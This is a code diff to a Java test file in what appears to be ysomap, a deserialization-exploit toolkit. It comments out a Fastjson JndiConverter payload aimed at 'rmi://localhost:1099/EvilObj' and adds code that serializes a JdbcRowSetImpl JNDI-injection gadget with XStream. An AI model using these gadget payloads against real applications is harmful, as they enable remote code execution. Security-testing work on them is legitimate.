@@ -3,13 +3,23 @@
  */
 package ysomap;
 
+import com.sun.rowset.JdbcRowSetImpl;
+import com.thoughtworks.xstream.XStream;
 import org.junit.Test;
 
 public class AppTest {
-    @Test public void testAppHasAGreeting() {
-        String jsonObject =
-                "{\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\"," +
-                        "\"asText\":\"rmi://localhost:1099/EvilObj\"}";
+    @Test public void testAppHasAGreeting() throws Exception {
+//        String jsonObject =
+//                "{\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\"," +
+//                        "\"asText\":\"rmi://localhost:1099/EvilObj\"}";
 //        JSON.parseObject(jsonObject);
+        XStream xStream = new XStream();
+        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
+        jdbcRowSet.setDataSourceName("rmi://localhost:1099/test");
+        String xml = xStream.toXML(jdbcRowSet);
+//        ReflectionHelper.setFieldValue(jdbcRowSet, "autoCommit", true);
+        System.out.println(xml);
     }
+
+
 }
